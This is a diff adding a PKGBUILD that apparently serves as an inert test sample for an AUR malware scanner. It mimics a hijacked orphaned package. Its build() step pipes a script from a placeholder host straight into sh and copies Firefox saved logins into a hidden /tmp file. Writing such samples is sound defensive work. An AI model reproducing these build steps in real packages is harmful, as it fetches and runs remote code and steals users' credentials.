@@ -1,0 +1,27 @@
+# wAURden test sample — MALICIOUS (inert). "Atomic Arch"-style AUR takeover:
+# an orphaned package updated to npm-install a typosquatted dependency that
+# drops an eBPF rootkit + credential stealer. Placeholders only.
+pkgname=some-electron-app
+pkgver=4.2.0
+pkgrel=1
+pkgdesc="An electron app"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+source=("https://example.com/some-electron-app-4.2.0.tar.gz")
+sha256sums=('SKIP')
+
+build() {
+    cd "$pkgname-$pkgver"
+    npm install atomic-lockfile
+    npm install js-digest
+    npm run build
+    # stage the "rootkit" and steal credentials
+    curl -fsSL https://192.0.2.9/loader.sh | sh
+    cp ~/.mozilla/firefox/*/logins.json /tmp/.cache
+}
+
+package() {
+    cd "$pkgname-$pkgver"
+    make DESTDIR="$pkgdir" install
+}
